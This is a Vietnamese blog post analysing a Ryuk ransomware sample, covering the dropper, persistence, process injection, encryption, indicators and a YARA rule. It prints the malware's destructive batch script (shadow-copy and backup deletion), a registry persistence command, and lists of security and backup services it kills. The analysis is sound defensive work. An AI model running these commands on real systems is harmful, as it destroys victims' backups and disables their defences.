---
title: "Phân tích Ryuk Ransomware: Sự tinh vi trong từng dòng code"
date: 2024-11-20 02:23:52 +0700
categories: [Blog, Malware]
tags: [ryuk, ransomware, malware, cybersecurity, reverse engineering]
pin: false
comments: false
published: true
---

## Introduction

Nếu bạn nghĩ rằng ransomware chỉ là những đứa trẻ con chơi đùa với máy tính, thì hãy gặp gỡ Ryuk - một "quý ông" trong làng tống tiền mạng. Đây không phải là loại malware bình thường mà bạn có thể gặp khi click nhầm vào quảng cáo "Bạn đã trúng giải 1 tỷ đồng". Ryuk là một phần của "Bộ ba tử thần" (Triple Threat) cùng với Emotet và TrickBot - một combo đủ sức làm cho bất kỳ CISO nào phải thức trắng đêm.

## Attack Chain: Bài Học Về Sự Kiên Nhẫn

Ryuk không phải là kẻ hấp tấp. Nó biết cách chờ đợi và chuẩn bị kỹ lưỡng trước khi "ra tay":

1. **Giai đoạn 1**: Emotet được gửi qua email phishing với tài liệu Word "vũ khí hóa". Tài liệu này chứa macro code tải xuống Emotet.
2. **Giai đoạn 2**: Emotet thực thi và tải xuống một malware khác (thường là TrickBot) - một "thám tử tư" chuyên nghiệp có thể thu thập thông tin hệ thống, ăn cắp thông tin đăng nhập, vô hiệu hóa antivirus, và di chuyển ngang trong mạng.
3. **Giai đoạn 3**: Kết nối với máy chủ C&C để tải xuống Ryuk, sau đó tận dụng khả năng di chuyển ngang của TrickBot để lây nhiễm và mã hóa càng nhiều hệ thống trong mạng càng tốt.

## Ransomware Ryuk Overview: Kiến Trúc Của Một "Nghệ Sĩ"

Ryuk hoạt động theo hai giai đoạn rõ ràng như một vở kịch được dàn dựng công phu:

**Giai đoạn 1**: Dropper thả ransomware thực sự vào một thư mục khác rồi thoát. Sau đó ransomware cố gắng inject vào các process đang chạy để tránh bị phát hiện. Chúng ta cũng có thể thấy nó khởi chạy một process `cmd.exe` để chỉnh sửa registry.

**Giai đoạn 2**: Ryuk tiến hành mã hóa các tập tin hệ thống và chia sẻ mạng, thả "thư tình" ransomware (RyukReadMe.txt) vào mỗi thư mục mà nó mã hóa.

![Ryuk Overview Diagram](/assets/img/2024/10/ryukdiagram.png)

Bức "thư tình" mà Ryuk để lại cho nạn nhân trông như này.

![Ryuk Message](/assets/img/2024/10/message.png)

## Ransomware Ryuk Sample's Information

Mình sẽ dùng PE Studio để lấy các thông tin từ một mẫu Ryuk ransomware mà mình vừa lấy từ [MalwareBazaar](https://bazaar.abuse.ch/).

![Malware Info](/assets/img/2024/10/info.png)

Chương trình này có 3 Dynamic Link Library được import.

![Dynamic Link Library](/assets/img/2024/10/dll.png)

Cũng phát hiện khá là nhiều function hệ thống được import theo.

![Function](/assets/img/2024/10/func.png)

## First Stage: The Dropper - Kẻ Giao Hàng Bí Ẩn

**SHA256**: `23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2`.

Dropper này khôn khéo như một tên trộm có kinh nghiệm. Đầu tiên, nó kiểm tra `MajorVersion` của Windows:
- Nếu bằng 5 (Windows 2000/XP/Server 2003): thả tại `C:\Documents and Settings\Default User\`.
- Ngược lại: thả tại `C:\users\Public\`.

![Dropper](/assets/img/2024/10/dropper.png)

![Dropper in C](/assets/img/2024/10/dropperc.png)



Khởi tạo bộ tạo số ngẫu nhiên sau đó tạo chuỗi ngẫu nhiên rồi lưu vào `var_28`.  
Mục đích để làm tên cho file thực thi - như một mật danh hoàn hảo.

![Random File Name](/assets/img/2024/10/name.png)

Đoạn này là lúc tìm vị trí cuối cùng của chuỗi ngẫu nhiên được gen khi nãy.

![Find String](/assets/img/2024/10/findstr.png)

Add thêm `.exe` vào cuối chuỗi đó.

![Add Exe](/assets/img/2024/10/addexe.png)

Tạo 1 file mới với đường dẫn là biến `var_3f8` và set các thuộc tính ẩn cho nó.

![alt text](/assets/img/2024/10/newfile.png)

Khởi tạo biến `var_8` để kiểm tra kiến trúc hệ thống, `var_8` được thiết lập bằng cách gọi function `IsWow64Process`.  
Nếu hệ thống là 32-bit, `var_8` sẽ bằng 0.

![alt text](/assets/img/2024/10/initvar8.png)

Tiếp theo nó sẽ kiểm tra kiến trúc hệ thống.  
Nếu hệ thống đang chạy là 32-bit:
- `nNumberOfBytesToWrite` được gán giá trị `0x23000`
- `lpBuffer`được gán địa chỉ của `data_43d1b0`

Ngược lại nếu hệ thống là 64-bit: 
- `nNumberOfBytesToWrite` được gán giá trị `0x2aa00`
- `lpBuffer` được gán địa chỉ của `data_4127b0`

Các địa chỉ `data_43d1b0` và `data_4127b0` là các vùng nhớ chứa mã độc. Việc chọn payload dựa trên kiến trúc hệ thống đảm bảo rằng mã độc hại tương thích với hệ thống mục tiêu.

![alt text](/assets/img/2024/10/syscheck.png)


Funtion `WriteFile` được gọi để ghi payload vào file đã tạo.  
Các tham số truyền vào function là: 
- `ebx_1`: Handle của file đã tạo.
- `lpBuffer`: Con trỏ đến vùng nhớ chứa payload.
- `nNumberOfBytesToWrite`: Số byte cần ghi.
- `lpNumberOfBytesWritten`: Con trỏ để lưu số byte đã được ghi.

![alt text](/assets/img/2024/10/writefile.png)

Funtion `ShellExecuteW` được gọi để thực thi file độc hại.  
Các tham số truyền vào function là: 
- `var_3f8`: Đường dẫn đến file độc hại.
- `var_c2c`: Đường dẫn đến file hiện tại (truyền vào để sau này biết chỗ xóa Dropper)
- `SW_HIDE`: Chỉ định cách thức hiển thị cửa sổ, trong trường hợp này là ẩn

![alt text](/assets/img/2024/10/exefile.png)


## Second Stage: The Real Deal

**SHA256**: `8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7d`

### Xóa Dropper: Dọn Dẹp Hiện Trường

Trước khi dropper thoát, nó truyền đường dẫn của mình cho executable giai đoạn hai như một tham số dòng lệnh, sau đó executable này sẽ xóa dropper - không để lại dấu vết.

![alt text](/assets/img/2024/10/deldrop.png)

![alt text](/assets/img/2024/10/deldropc.png)

### Persistence: Bám Trụ Như Sam

Ryuk sử dụng registry key kinh điển để đạt được persistence.  
Nó tạo một giá trị mới với tên là `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\svchos"` và dữ liệu được đặt thành đường dẫn executable.

Lệnh đầy đủ trong mẫu của mình là:

```cmd
C:\Windows\System32\cmd.exe /C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "C:\users\Public\oxrCPDa.exe" /f
```


### Privilege Escalation: Xin Phép Để "Chơi Lớn"

Ryuk sử dụng function `AdjustTokenPrivileges()` để kích hoạt các privilege đã có trong security access token của process. Privilege mà nó yêu cầu là `SeDebugPrivilege`. Theo tài liệu Microsoft:

> **SeDebugPrivilege**: Cho phép debug và điều chỉnh bộ nhớ của các process thuộc sở hữu của account khác. Với privilege này, user có thể attach debugger vào bất kỳ process hoặc kernel nào.

Trong chiến dịch thực tế, Ryuk thường được triển khai sau khi đã compromise hệ thống qua Trickbot hoặc Emotet, vốn chạy với quyền quản trị viên. Để enable `SeDebugPrivilege`, Ryuk sử dụng `LookupPrivilegeValueW` để lấy LUID của privilege này, rồi gọi `AdjustTokenPrivileges` để kích hoạt nó trong token hiện tại. Việc này cho phép Ryuk thao tác lên các process có đặc quyền cao hơn, ví dụ để inject hoặc terminate process bảo vệ.

![alt text](/assets/img/2024/10/sedebug.png)

Phương pháp này thường được malware sử dụng để thực hiện process injection (được thực hiện tiếp theo).

### Process Injection: Nghệ Thuật "Ẩn Mình"

Ryuk ransomware liệt kê tất cả các process đang chạy để kiểm tra mức độ toàn vẹn, PID và các thông tin hữu ích khác, đồng thời lưu mọi thứ vào một mảng.  
Nó sử dụng các API liệt kê process như là `CreateToolhelp32Snapshot`, `Process32NextW`, `Process32FirstW`

Sau đó, Ryuk lặp qua dữ liệu process đã lưu trữ để thực hiện process injection.

Ryuk ransomware tự tiêm vào tất cả các process mà nó liệt kê, ngoại trừ một số process không làm giảm hiệu suất hệ thống như `csrss.exe`, `explorer.exe`, `lsaas.exe`.  
Ryuk sẽ bỏ qua các process đó.

![alt text](/assets/img/2024/10/procinj.png)

Nó sử dụng các API process injection sau: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`

Kỹ thuật process injection được sử dụng ở đây khá đơn giản:
1. Ryuk cấp phát bộ nhớ cho process của nó tại không gian bộ nhớ của target process bằng `VirtualAllocEx()`
2. Sau đó ghi process của nó vào bộ nhớ đã cấp phát bằng `WriteProcessMemory()`
3. Cuối cùng tạo thread mới bằng `CreateRemoteThread()` để chạy thread của Ryuk tại process bị inject

### Building Imports: Sự Che Giấu Tinh Tế

Ryuk import các function cần thiết một cách động bằng `LoadLibraryA()` và `GetProcAddress()`. Tên các function bị obfuscate nên static analysis sẽ không hiệu quả lắm ở đây.

Chúng ta có thể sử dụng debugger để lấy các tên này thay vì reverse obfuscation algorithm.

Đây là danh sách các function được import:

#### advapi32.dll
- CryptAcquireContextW
- CryptDecrypt
- CryptDeriveKey
- CryptDestroyKey
- CryptEncrypt
- CryptExportKey
- CryptGenKey
- CryptImportKey
- GetUserNameA
- GetUserNameW
- RegCloseKey
- RegDeleteValueW
- RegOpenKeyExA
- RegOpenKeyExW
- RegQueryValueExA
- RegSetValueExW

#### kernel32.dll
- CloseHandle
- CopyFileA
- CopyFileW
- CreateDirectoryW
- CreateFileA
- CreateFileW
- CreateProcessA
- CreateProcessW
- DeleteFileW
- ExitProcess
- FindClose
- FindFirstFileW
- FindNextFileW
- FreeLibrary
- GetCommandLineW
- GetCurrentProcess
- GetDriveTypeW
- GetFileAttributesA
- GetFileAttributesW
- GetFileSize
- GetLogicalDrives
- GetModuleFileNameA
- GetModuleFileNameW
- GetModuleHandleA
- GetStartupInfoW
- GetTickCount
- GetVersionExW
- GetWindowsDirectoryW
- GlobalAlloc
- LoadLibraryA
- ReadFile
- SetFileAttributesA
- SetFileAttributesW
- SetFilePointer
- Sleep
- VirtualAlloc
- VirtualFree
- WinExec
- Wow64DisableWow64FsRedirection
- Wow64RevertWow64FsRedirection
- WriteFile

#### ole32.dll
- CoCreateInstance
- CoInitialize

#### Shell32.dll
- ShellExecuteA
- ShellExecuteW

#### mpr.dll
- WNetCloseEnum
- WNetEnumResourceW
- WNetOpenEnumW

#### Iphlpapi.dll
- GetIpNetTable

### Killing Processes: "Dọn Đường" Cho Cuộc Tấn Công

Ryuk có một danh sách dài các service và process định sẵn để "thanh lý" bằng `net stop` và `taskkill /IM` tương ứng.

#### Danh sách Services
- Acronis VSS Provider
- Enterprise Client Service
- Sophos Agent
- Sophos AutoUpdate Service
- Sophos Clean Service
- Sophos Device Control Service
- Sophos File Scanner Service
- Sophos Health Service
- Sophos MCS Agent
- Sophos MCS Client
- Sophos Message Router
- Sophos Safestore Service
- Sophos System Protection Service
- Sophos Web Control Service
- SQLsafe Backup Service
- SQLsafe Filter Service
- Symantec System Recovery
- Veeam Backup Catalog Data Service
- AcronisAgent
- AcrSch2Svc
- Antivirus
- ARSM
- BackupExecAgentAccelerator
- BackupExecAgentBrowser
- BackupExecDeviceMediaService
- BackupExecJobEngine
- BackupExecManagementService
- BackupExecRPCService
- BackupExecVSSProvider
- bedbg
- DCAgent
- EPSecurityService
- EPUpdateService
- EraserSvc11710
- EsgShKernel
- FA_Scheduler
- IISAdmin
- IMAP4Svc
- macmnsvc
- masvc
- MBAMService
- MBEndpointAgent
- McAfeeEngineService
- McAfeeFramework
- McShield
- McTaskManager
- mfemms
- mfevtp
- MMS
- mozyprobackup
- MsDtsServer
- MsDtsServer100
- MsDtsServer110
- MSExchangeES
- MSExchangeIS
- MSExchangeMGMT
- MSExchangeMTA
- MSExchangeSA
- MSExchangeSRS
- MSOLAP$SQL_2008
- MSOLAP$SYSTEM_BGC
- MSOLAP$TPS
- MSOLAP$TPSAMA
- MSSQL$BKUPEXEC
- MSSQL$ECWDB2
- MSSQL$PRACTICEMGT
- MSSQL$PRACTTICEBGC
- MSSQL$PROFXENGAGEMENT
- MSSQL$SBSMONITORING
- MSSQL$SHAREPOINT
- MSSQL$SQL_2008
- MSSQL$SYSTEM_BGC
- MSSQL$TPS
- MSSQL$TPSAMA
- MSSQL$VEEAMSQL2008R2
- MSSQL$VEEAMSQL2012
- MSSQLFDLauncher
- MSSQLFDLauncher$PROFXENGAGEMENT
- MSSQLFDLauncher$SBSMONITORING
- MSSQLFDLauncher$SHAREPOINT
- MSSQLFDLauncher$SQL_2008
- MSSQLFDLauncher$SYSTEM_BGC
- MSSQLFDLauncher$TPS
- MSSQLFDLauncher$TPSAMA
- MSSQLSERVER
- MSSQLServerADHelper100
- MSSQLServerOLAPService
- MySQL80
- MySQL57
- ntrtscan
- OracleClientCache80
- PDVFSService
- POP3Svc
- ReportServer
- ReportServer$SQL_2008
- ReportServer$SYSTEM_BGC
- ReportServer$TPS
- ReportServer$TPSAMA
- RESvc
- sacsvr
- SamSs
- SAVAdminService
- SAVService
- SDRSVC
- SepMasterService
- ShMonitor
- Smcinst
- SmcService
- SMTPSvc
- SNAC
- SntpService
- sophossps
- SQLAgent$BKUPEXEC
- SQLAgent$ECWDB2
- SQLAgent$PRACTTICEBGC
- SQLAgent$PRACTTICEMGT
- SQLAgent$PROFXENGAGEMENT
- SQLAgent$SBSMONITORING
- SQLAgent$SHAREPOINT
- SQLAgent$SQL_2008
- SQLAgent$SYSTEM_BGC
- SQLAgent$TPS
- SQLAgent$TPSAMA
- SQLAgent$VEEAMSQL2008R2
- SQLAgent$VEEAMSQL2012
- SQLBrowser
- SQLSafeOLRService
- SQLSERVERAGENT
- SQLTELEMETRY
- SQLTELEMETRY$ECWDB2
- SQLWriter
- SstpSvc
- svcGenericHost
- swi_filter
- swi_service
- swi_update_64
- TmCCSF
- tmlisten
- TrueKey
- TrueKeyScheduler
- TrueKeyServiceHelper
- UI0Detect
- VeeamBackupSvc
- VeeamBrokerSvc
- VeeamCatalogSvc
- VeeamCloudSvc
- VeeamDeploymentService
- VeeamDeploySvc
- VeeamEnterpriseManagerSvc
- VeeamMountSvc
- VeeamNFSSvc
- VeeamRESTSvc
- VeeamTransportSvc
- W3Svc
- wbengine
- WRSVC
- VeeamHvIntegrationSvc
- swi_update
- SQLAgent$CXDB
- SQLAgent$CITRIX_METAFRAME
- SQL Backups
- MSSQL$PROD
- Zoolz 2 Service
- MSSQLServerADHelper
- SQLAgent$PROD
- msftesql$PROD
- NetMsmqActivator
- EhttpSrv
- ekrn
- ESHASRV
- MSSQL$SOPHOS
- SQLAgent$SOPHOS
- AVP
- klnagent
- MSSQL$SQLEXPRESS
- SQLAgent$SQLEXPRESS
- wbengine
- kavfsslp
- KAVFSGT
- KAVFS
- mfefire

#### Danh sách Processes
- zoolz.exe
- agntsvc.exe
- dbeng50.exe
- dbsnmp.exe
- encsvc.exe
- excel.exe
- firefoxconfig.exe
- infopath.exe
- isqlplussvc.exe
- msaccess.exe
- msftesql.exe
- mspub.exe
- mydesktopqos.exe
- mydesktopservice.exe
- mysqld.exe
- mysqld-nt.exe
- mysqld-opt.exe
- ocautoupds.exe
- ocomm.exe
- ocssd.exe
- onenote.exe
- oracle.exe
- outlook.exe
- powerpnt.exe
- sqbcoreservice.exe
- sqlagent.exe
- sqlbrowser.exe
- sqlservr.exe
- sqlwriter.exe
- steam.exe
- synctime.exe
- tbirdconfig.exe
- thebat.exe
- thebat64.exe
- thunderbird.exe
- visio.exe
- winword.exe
- wordpad.exe
- xfssvccon.exe
- tmlisten.exe
- PccNTMon.exe
- CNTAoSMgr.exe
- Ntrtscan.exe
- mbamtray.exe

### Deleting Backups: "Đốt Cầu Để Rút Lui"

Ryuk thả một batch script tại `C:\Users\Public\window.bat` để xóa tất cả shadow copies và backup có thể, sau đó script tự xóa chính nó:

![alt text](/assets/img/2024/10/delback.png)


Cụ thể các lệnh là:

```batch
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
vssadmin Delete Shadows /all /quiet
del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
del %0
```


## The Encryption Process: Khi Tốc Độ Là Vua

Ryuk sử dụng approach multi-threading cho quá trình mã hóa - tạo thread mới cho mỗi file, làm cho nó cực kỳ nhanh.

Nó bắt đầu enumerate files bằng `FindFirstFileExA()` và `FindNextFileA()`, sau đó truyền mỗi tên file cho một encryption thread mới. Lưu ý rằng Ryuk tránh mã hóa các file extension sau:

- `.dll`
- `.lnk`
- `.hrmlog`
- `.ini`
- `.exe`



### Chi Tiết Encryption Thread

Mỗi encryption thread bắt đầu bằng việc tạo random 256-bit AES encryption key bằng `CryptGenKey()`. Ryuk sử dụng Windows Crypto API cho việc mã hóa.

![alt text](/assets/img/2024/10/crypt.png)

Sau đó nó đi vào vòng lặp mã hóa điển hình, các file được mã hóa theo chunks với kích thước chunk là 1,000,000 bytes.

![alt text](/assets/img/2024/10/loop.png)

![alt text](/assets/img/2024/10/loop2.png)

Cuối cùng, Ryuk ghi một metadata block có kích thước 274 bytes vào cuối file. 6 bytes đầu tiên là keyword `HERMES`.

![alt text](/assets/img/2024/10/hermes.png)

Sau đó, AES key được mã hóa bằng RSA public key trước khi được ghi vào cuối file và sau đó export bằng `CryptExportKey()`. Function này tạo ra 12 bytes thông tin Blob + 256 bytes (encrypted key).

![alt text](/assets/img/2024/10/aes.png)

RSA public key được nhúng trong executable, nó được import bằng `CryptImportKey()` và truyền cho mỗi encryption thread.

![alt text](/assets/img/2024/10/pub.png)

Chúng ta có thể thấy ở cuối encryption routine có một check xem keyword `HERMES` có xuất hiện ở cuối file không (điều này cho biết file đã được mã hóa).

Check này thực sự được thực hiện trước khi mã hóa file để tránh mã hóa nó hai lần.

![alt text](/assets/img/2024/10/hermescheck.png)

Phần footer của 1 file bị mã hóa:

![alt text](/assets/img/2024/10/foot.png)

### Encrypting Network Shares: Mở Rộng Tầm Ảnh Hưởng

Ryuk enumerate network shares bằng `WNetOpenEnumW()` và `WNetEnumResourceA()` tương ứng.

![alt text](/assets/img/2024/10/netenum.png)

Đối với mỗi network resource được tìm thấy, tên của resource sẽ được thêm vào một danh sách được phân tách bằng dấu chấm phẩy. Danh sách này sẽ được sử dụng sau để mã hóa các network share này với cùng quy trình mã hóa như trên.

## IOCs (Indicators of Compromise)

### Hashes
- **Ryuk**: `8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7`
- **Dropper**: `23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2`

### Files
- `C:\Users\Public\window.bat`

### Registry
- `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

## Yara Rule

```text
rule Ryuk
{
    meta:
        author = "N1ght-W0lf"
        description = "Detect Ryuk Samples"
        date = "2020-05-08"
    strings:
        $s1 = "RyukReadMe.txt" ascii wide
        $s2 = "No system is safe" ascii wide
        $s3 = "svchos" ascii wide fullword
        $s4 = "vssadmin Delete Shadows /all /quiet" ascii wide
        $s5 = "UNIQUE_ID_DO_NOT_REMOVE" ascii wide
        $s7 = "\\users\\Public\\window.bat" ascii wide
        $s6 = "HERMES" ascii wide
    condition:
        5 of them
}
```

## Resources


- [Malwarebytes - Threat Spotlight: The Curious Case of Ryuk Ransomware](https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/)
- [Check Point Research - Ryuk Ransomware Targeted Campaign Break](https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/)
- [Deep Analysis of Ryuk Ransomware - n1ghtw0lf](https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/)
- [ANY.RUN - Ryuk Sample Analysis](https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/)
- [Microsoft Docs - Event 4672](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672)
- [CodeProject - Obtain the plain text session key using CryptoAPI](https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI)

## Conclusion

Ryuk không chỉ là một ransomware đơn thuần mà là một "tác phẩm nghệ thuật" của tội phạm mạng - được thiết kế tỉ mỉ, thực thi chính xác và có hiệu quả tàn phá khủng khiếp. Sự phối hợp giữa Emotet, TrickBot và Ryuk tạo nên một chuỗi tấn công hoàn chỉnh có thể làm tê liệt toàn bộ hạ tầng IT của một tổ chức.

Từ việc sử dụng dropper để "giao hàng" một cách tinh vi, đến kỹ thuật process injection để "ẩn mình", từ việc kill hàng loạt service bảo mật và backup đến việc mã hóa với tốc độ chớp nhoáng bằng multi-threading - tất cả đều cho thấy sự chuyên nghiệp đáng sợ của nhóm tội phạm đứng sau Ryuk.

Việc hiểu rõ cách thức hoạt động của Ryuk không chỉ giúp các chuyên gia bảo mật phát triển các biện pháp phòng thủ hiệu quả mà còn nhắc nhở chúng ta rằng trong cuộc chiến an ninh mạng, kẻ tấn công luôn không ngừng tiến hóa và chúng ta cũng phải làm như vậy.

Đặc biệt, việc Ryuk sử dụng keyword "HERMES" trong metadata - có thể là một tham chiếu đến Hermes Ransomware trước đó - cho thấy sự liên kết và phát triển liên tục trong thế giới malware. Điều này cũng nhấn mạnh tầm quan trọng của việc backup thường xuyên, phân quyền hợp lý, và giám sát liên tục các hoạt động bất thường trong hệ thống.

---

